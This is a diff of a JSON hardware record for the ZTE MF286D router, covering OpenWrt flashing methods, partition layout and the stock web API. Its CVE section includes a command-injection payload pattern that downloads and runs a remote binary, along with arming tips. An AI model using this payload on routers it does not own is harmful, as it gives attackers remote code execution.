@@ -1,55 +1,126 @@
 {
   "id": "zte-mf286d",
-  "lan_subnet": "192.168.0.0/24",
   "vendor": "ZTE",
-  "description": "LTE Cat-12 indoor router (IPQ4019 + mPCIe MDM9250-class modem), Nordic/Telia carrier variants common on the second-hand market. Stock firmware is a ZTE-customized OpenWrt Chaos-Calmer-era fork with the goahead-based ZTE-Webs web UI.",
+  "description": "MF286D LTE cat.12 router (IPQ4019 + MDM9650 modem, Nordic/Telia carrier family)",
   "openwrt": {
     "target": "ipq40xx/generic",
-    "device": "zte_mf286d",
-    "profile": "zte_mf286d",
+    "device": "zte,mf286d",
     "default_ip": "192.168.1.1",
-    "version": "25.12.6",
-    "note": "Officially supported since 25.12.x. Arch arm_cortex-a7-neon-vfpv4. Sibling MF286C is ath79/mips \u2014 do not mix artifacts."
+    "profile": "zte_mf286d",
+    "release": "25.12.6",
+    "version": "25"
   },
   "hardware": {
-    "soc": "Qualcomm Atheros IPQ4019 (4x ARM Cortex-A7)",
-    "flash": "128 MB NAND (mtd8 web-cramfs + mtd9 UBI kernel+rootfs) + NOR (bootloader chain, 0:config/ART)",
-    "ram": "256 MB",
-    "ethernet_ports": "1x shared WAN/LAN1 + 3x LAN, all GbE",
-    "wifi": "integrated 2.4+5 GHz 802.11ac (IPQ40xx radio)",
-    "modem": {
-      "model": "ZTE cat.12 mPCIe module (MDM9250-class), ZTE Qualcomm-family firmware",
-      "usb_vendor_id": null,
-      "usb_product_id": null,
-      "capability": [
-        "qmi",
-        "mbim",
-        "at"
-      ],
-      "usb_interfaces": "/dev/ttyUSB* under OpenWrt; AT historically ttyUSB1 in this family \u2014 re-detect per session",
-      "at_port": null,
-      "qmi_device": "/dev/cdc-wdm0 (expected; verify on first boot)",
-      "note": "Modem firmware steps B02->B12 via adb push + AT+FOTACTR deltas (makebit resources). AT+CSIM behavior unprobed (see modem-as-reader playbook appendix C)."
-    },
-    "serial": {
-      "uart": "X8 connector, 115200 8N1",
-      "note": "Requires case opening + soldering or clips \u2014 avoid; all known no-serial paths documented in recipes/zte/mf286d/notes.md"
-    },
-    "board_revision": "MF286DHW1.0",
-    "enclosure": "desktop",
-    "note": "LEDs largely driven by the modem, not the SoC (OpenWrt wiki)."
+    "soc": "Qualcomm IPQ4019 quad-core Cortex-A7",
+    "modem": "ZTE MF286DMODULE (MDM9650, cat.12) on USB (dwc3), QMI 19d2:1485, AT port /dev/ttyUSB2",
+    "flash": "SPI-NOR 2MB (gd25q16: SBL1/MIBIB/QSEE/CDT/DDRPARAMS/APPSBLENV/APPSBL) + SPI-NAND 128MB (128KiB erase blocks)",
+    "ram": "256MB DDR3",
+    "ethernet_ports": "4x LAN 1G + WAN via port1 (OpenWrt DT: wan=port1)",
+    "wifi": "2.4GHz + 5GHz 802.11ac (IPQ4019 integrated)",
+    "uart": "Board has an unpopulated 4-pin header (3.3V UART, 115200); no serial required for the TFTP flash method",
+    "power": "12V DC barrel"
   },
   "mac_oui": [
     "C8:EA:F8"
   ],
-  "stock_default_ip": "192.168.0.1 (Nordic/Telia variant; global builds use 192.168.32.1)",
+  "stock_default_ip": {
+    "nordic_telia": "192.168.0.1",
+    "global": "192.168.32.1 (also the download/E3 environment address)",
+    "openwrt_after_flash": "192.168.1.1"
+  },
+  "nand_partition_map": {
+    "_units": "bytes; runtime mtdN in parentheses (NAND mtd0..11, NOR mtd12..19)",
+    "fota-flag": "0x0000000 + 0xA0000 (mtd0) — bootloader handoff flag, first good 128KiB block, byte 0",
+    "ART": "0x00A0000 + 0x80000 (mtd1)",
+    "mac": "0x0012000 + 0x80000 (mtd2)",
+    "cfg-param": "0x0026000 + 0x400000 (mtd4)",
+    "web": "0x1000000 + 0x800000 (mtd8) — stock cramfs web UI",
+    "rootfs": "0x1800000 + 0x1D00000 (mtd9) — UBI: kernel + ubi_rootfs(squashfs) + rootfs_data(autoresize)",
+    "data": "0x3500000 + 0x1900000 (mtd10)",
+    "fota": "0x4E00000 + 0x3200000 (mtd11) — ZDF delta staging (yaffs under stock)",
+    "0:APPSBL": "NOR 0xF0000 + 0xC0000 (mtd18) — U-Boot (ELF, entry 0x87300000)"
+  },
+  "flash_methods": {
+    "tftp-blank-download": {
+      "description": "Stock U-Boot blank-download recovery: the bootloader itself TFTP-pulls root_uImage from 192.0.0.1:69 and rewrites web+rootfs (never NOR). Entered when the rootfs UBI attaches but has no kernel volume (e.g. interrupted flash, or a deliberately staged trigger UBI), or on a download-mode boot. No serial, no case opening.",
+      "recovery_ip": "192.0.0.1",
+      "client_ip": "derived per boot (192.x.y.z; watch ARP or the RRQ source)",
+      "client_subnet": "255.0.0.0",
+      "image": "root_uImage wrapper, exactly 38797312 bytes: [8MiB web region][0x1D00000 UBI(kernel,rootfs,rootfs_data)] — see docs/zte-mf286d-flashing.md",
+      "tftp_options": "blksize (client asks 1468) + timeout (5s) — RFC 2348/2349 OACK required",
+      "success_signal": "UDP payload 'OK:zte blank download is done' sent back to the server :69 after the write completes",
+      "flash_time_seconds": 60,
+      "caveats": [
+        "A FULLY erased rootfs does NOT trigger the pull (UBI attach fails before the kernel-volume check) — stage a layout-volume-bearing UBI or use a stock download-mode boot instead",
+        "Serve ANY requested filename (aliased to the pinned image) — the zdu no-bootfile path derives a per-boot 4-hex-byte name",
+        "Never run two servers on 192.0.0.1:69; the fin packet is the only success oracle"
+      ],
+      "image_provenance": "CAUTION: dl.eko.one.pl NORDIC/B12/mtd9.bin is a community OpenWrt 22.03-rc5 dump, NOT stock (ztsuf lane finding, #621). Stock-equivalent dumps: B02..B11. Ready-made 2022-era OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3; official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641.",
+      "envelope_notes": "image-type-factory-root-uimage; sha256-pinned; nor-untouched",
+      "envelope": [
+        "image-type-factory"
+      ],
+      "resources_notes": "power; recovery-subnet (host interface at 192.0.0.1); tftp-server (scripts/zte-blankdl-flashd.py)",
+      "resources_required": [
+        "power",
+        "recovery-subnet",
+        "tftp-server"
+      ]
+    },
+    "sysupgrade": {
+      "description": "SSH sysupgrade from existing OpenWrt",
+      "command": "sysupgrade -n /tmp/firmware.bin",
+      "exit_code": 246,
+      "resources_required": [
+        "ssh-service"
+      ],
+      "envelope": [
+        "board-name-match"
+      ]
+    },
+    "zte-suf-root-uimage": {
+      "description": "ZTE Sales Update Framework flashing of a crafted root_uImage (mtd8+mtd9 concatenation, 38797312 bytes, erased 0xFF padding then UBI at 0x800000)",
+      "image_builder": "ilblogdicristiangallo/ZTE-MF286D-root_uImage-Builder (official sysupgrade.bin -> root_uImage)",
+      "provenance": "Stock images: dl.eko.one.pl/orig/zte_mf286d/NORDIC/{B02..B11}; CAUTION: NORDIC/B12/mtd9.bin is NOT stock — it is a community OpenWrt 22.03-rc5 dump whose bundled goahead differs from stock (ztsuf lane finding, #621). Ready-made OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3 (2022-era, bootstrap then sysupgrade) or build fresh from official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641",
+      "partitions_touched": "mtd8+mtd9 only; bootloader/NOR/ART/modem EFS untouched (dump remaining partitions from OpenWrt post-flash for the unit-unique backup)",
+      "rollback": "same flow with stock root_uImageorig from the kit",
+      "known_good": true,
+      "status": "superseded for installs by tftp-blank-download; retained for stock-rollback service and for units already inside the SUF/E3 tooling path",
+      "envelope_notes": "LAN, device in download mode (or driven there via SwitchFactoryMode), ~5 min write window",
+      "envelope": [
+        "image-type-factory"
+      ],
+      "resources_notes": "SUF kit (makebit/mf286d-openwrt archive or equivalent UPDATE/ set); Windows PE environment (community uses Hiren's/Gandalf PE; QEMU+ISO or wine attempt); admin web password; point-to-point or isolated VLAN to the device (download-mode DHCP + SBL listener)",
+      "resources_required": [
+        "power",
+        "stock-web-admin",
+        "recovery-subnet",
+        "tftp-server"
+      ]
+    }
+  },
+  "signatures": {
+    "boot_log": [
+      "Uaztemain: enter into !",
+      "zte_getHandOffState: read data="
+    ],
+    "uboot_banner": "Z-LOADER/IPQ40xx (IPQ40xx) # prompt in download mode"
+  },
+  "capabilities": [
+    "ethernet"
+  ],
+  "tested_hardware": {
+    "confirmed_on": "Nordic/Telia B09 router + BD_TELIAMF286DV1.0.0B09 modem (2026-11: full flash to OpenWrt 25.12.6 via tftp-blank-download, zero bricks, no serial)",
+    "modem_fw_note": "QMI works on modem fw B11/B12 and below; B14 breaks QMI under OpenWrt (community-verified; downgrade is lengthy). Check ATI before configuring wwan."
+  },
+  "notes": "Species-level docs in docs/zte-mf286d-flashing.md. Stock rollback: serve a full-stock root_uImage (e.g. the Telia/Nordic B02 kit image) over the same TFTP path. Exploit-grade research (stock-web command injection, FOTA signature-chain findings) is intentionally NOT documented here — it lives in the private research repo pending a disclosure decision. Species-level record for conwrt issue #621. Unit-level identifiers (MAC/IMEI/passwords) belong in the operator's private project only.",
   "stock_web": {
     "server": "ZTE-Webs/2.5.0 (goahead-derived; handler binary usr/bin/goahead or zte_topsw_goahead depending on generation)",
     "api": {
       "get": "/goform/goform_get_cmd_process",
       "set": "/goform/goform_set_cmd_process",
       "factory": "/goform/goform_process",
-      "login_password_encoding": "SHA256hex-UPPERCASE(Base64(password)) \u2014 note: uppercase hex; MU5001-era lowercase variants do NOT match",
+      "login_password_encoding": "SHA256hex-UPPERCASE(Base64(password)) — note: uppercase hex; MU5001-era lowercase variants do NOT match",
       "session": "IP-bound + AD token per POST: AD = md5hex(md5hex(wa_inner_version + cr_version) + RD), RD fetched read-only via cmd=RD",
       "lockout": "5 failed logins -> 300s lock; counter PERSISTS ACROSS REBOOTS (stored in cfg). Do not brute-force; compute the token offline.",
       "notes": "Version reads (wa_inner_version, cr_version) answer unauthenticated. Authenticated browser-context is the most reliable write channel; bare curl sessions can return ambiguous results for some goformIds."
@@ -61,9 +132,9 @@
         "ONLINE_UPGRADE_TOOL": "goformId=ONLINE_UPGRADE_TOOL&command=get_current_version -> full version manifest. ANSWERS UNAUTHENTICATED (info disclosure, CVE-report candidate)"
       },
       "download_mode": {
-        "entry": "Fota-flag partition byte 0 gates U-Boot every boot (uaztemain): 0x45/0x47/0x55 -> update flow, 0x20/0x4e/0x42/0xff -> normal boot. Flag writer is /usr/bin/update_control set_update_flag() (0x45/0x55/0x20 for its modes). A sticky flag with an EMPTY delta partition = per-boot retry then normal boot \u2014 it never pulls root_uImage; the flag only gates an in-NAND delta apply at 0x3500000. Devices observed stuck in the E3/download environment across power cycles carry a sticky flag plus staged state; the E3 env runs its own ZTE-Webs/2.5.0 at 192.168.32.1",
+        "entry": "Fota-flag partition byte 0 gates U-Boot every boot (uaztemain): 0x45/0x47/0x55 -> update flow, 0x20/0x4e/0x42/0xff -> normal boot. Flag writer is /usr/bin/update_control set_update_flag() (0x45/0x55/0x20 for its modes). A sticky flag with an EMPTY delta partition = per-boot retry then normal boot — it never pulls root_uImage; the flag only gates an in-NAND delta apply at 0x3500000. Devices observed stuck in the E3/download environment across power cycles carry a sticky flag plus staged state; the E3 env runs its own ZTE-Webs/2.5.0 at 192.168.32.1",
         "behavior": "Device becomes DHCP client REQUESTING 192.168.32.1 and ARPs every ~1-5s for the tool host 192.0.0.1; SBL tftp-Gets armprg (armprgZTE.bin) from the tool's TFTP :69, then Sahara hello (8x1s retries) -> Firehose. One-shot per boot attempt. Live factory-state ports observed on the LAN side: 3535, 8787 (facSvr candidates), 10005 (remserial).",
-        "tool": "ZTE_Sales_Update_Framework.exe (Windows, MFC; runs under wine 9.0 only to splash+crash \u2014 use WinPE/QEMU); UPDATE/ folder images are NOT signature-checked (community root_uImage swaps proven)"
+        "tool": "ZTE_Sales_Update_Framework.exe (Windows, MFC; runs under wine 9.0 only to splash+crash — use WinPE/QEMU); UPDATE/ folder images are NOT signature-checked (community root_uImage swaps proven)"
       }
     }
   },
@@ -71,9 +142,9 @@
     "cve-2022-39073": {
       "title": "WATCH_DOG_SWITCH net_link_detect_url command injection (MF286R, CVSS 9.8)",
       "status_on_this_device": "handler LIVE on Nordic B09/B10-gen; net_link_detect_url accepts and stores ';'-payloads byte-intact (verified readback); exec sink is system('watch_dog_ping.sh <url> <times>') in zte_net_link_detect",
-      "gate": "WAN status must be ppp_connected/ipv4_ipv6_connected/ipv6_connected (exact match \u2014 beware 'connected' substring matching 'ppp_disconnected'!); the binary refuses to run its check otherwise",
+      "gate": "WAN status must be ppp_connected/ipv4_ipv6_connected/ipv6_connected (exact match — beware 'connected' substring matching 'ppp_disconnected'!); the binary refuses to run its check otherwise",
       "payload_pattern": ";curl -o /tmp/s http://<host>:<port>/s;chmod +x /tmp/s;/tmp/s (curl AND tftp both present in this generation's rootfs)",
-      "watch_out": "the same feature REBOOTS the device after net_link_detect_ping_times failed pings \u2014 set ping_times high when arming, or the box reboot-cycles"
+      "watch_out": "the same feature REBOOTS the device after net_link_detect_ping_times failed pings — set ping_times high when arming, or the box reboot-cycles"
     },
     "cve-2023-25649": {
       "title": "SET_DEVICE_LED night-mode command injection (MF286R, ZDI-23-818)",
@@ -84,47 +155,11 @@
       "status_on_this_device": "ABSENT: Nordic B09/B10 zte_debug.sh is a log-compression script with no tftp/exec feature; ipacm_switch.sh only tests the value for emptiness. Pre-existing injection entries found stored on a second-hand unit were inert."
     }
   },
-  "flash_methods": {
-    "zte-suf-root-uimage": {
-      "description": "ZTE Sales Update Framework flashing of a crafted root_uImage (mtd8+mtd9 concatenation, 38797312 bytes, erased 0xFF padding then UBI at 0x800000)",
-      "resources_required": [
-        "stock-web-admin",
-        "physical-access",
-        "recovery-subnet",
-        "packet-observer"
-      ],
-      "image_builder": "ilblogdicristiangallo/ZTE-MF286D-root_uImage-Builder (official sysupgrade.bin -> root_uImage)",
-      "provenance": "Stock images: dl.eko.one.pl/orig/zte_mf286d/NORDIC/{B02..B11}; CAUTION: NORDIC/B12/mtd9.bin is NOT stock \u2014 it is a community OpenWrt 22.03-rc5 dump whose bundled goahead differs from stock (ztsuf lane finding, #621). Ready-made OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3 (2022-era, bootstrap then sysupgrade) or build fresh from official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641",
-      "envelope": [
-        "image-type-factory"
-      ],
-      "partitions_touched": "mtd8+mtd9 only; bootloader/NOR/ART/modem EFS untouched (dump remaining partitions from OpenWrt post-flash for the unit-unique backup)",
-      "rollback": "same flow with stock root_uImageorig from the kit",
-      "known_good": true,
-      "notes": "Resource detail (schema enum mapped 2026-11-06, prose preserved): SUF kit (makebit/mf286d-openwrt archive or equivalent UPDATE/ set); Windows PE environment (community uses Hiren's/Gandalf PE; QEMU+ISO or wine attempt); admin web password; point-to-point or isolated VLAN to the device (download-mode DHCP + SBL listener). Envelope prose (preserved): LAN, device in download mode (or driven there via SwitchFactoryMode), ~5 min write window."
-    },
-    "serial-tftp-initramfs": {
-      "description": "wiki route: serial console 115200 on X8, u-boot tftp of initramfs ITB, then sysupgrade -n",
-      "envelope": [
-        "image-type-factory"
-      ],
-      "known_good": true,
-      "notes": "Envelope prose (preserved): serial (soldering) \u2014 last resort.",
-      "resources_required": [
-        "serial-console",
-        "tftp-server",
-        "physical-access"
-      ]
-    }
-  },
   "bench_observations": [
     "Variant fingerprint: BD_TELIAMF286DV1.0.0B09 / CR_TELIAMF286DV1.0.0B10 / Nordic_MF286D_B10 (mix of B09 wa + B10 cr strings is normal)",
     "USB ethernet adapters on the AI host: r8152 devices need power/control=on pinned (autosuspend disconnect-storms under load)",
-    "Laptop /tmp cleaners remove staged scripts/ISOs across multi-day sessions \u2014 re-stage from source repos or keep under /tmp/opencode subdirs with recent mtimes",
-    "Port 8080 on shared build hosts is frequently taken by other lanes' docker \u2014 verify payload-server ports before arming remote-exec URLs"
+    "Laptop /tmp cleaners remove staged scripts/ISOs across multi-day sessions — re-stage from source repos or keep under /tmp/opencode subdirs with recent mtimes",
+    "Port 8080 on shared build hosts is frequently taken by other lanes' docker — verify payload-server ports before arming remote-exec URLs"
   ],
-  "notes": "Species-level record for conwrt issue #621. Unit-level identifiers (MAC/IMEI/passwords) belong in the operator's private project only.",
-  "capabilities": [
-    "ethernet"
-  ]
+  "lan_subnet": "192.168.0.0/24"
 }
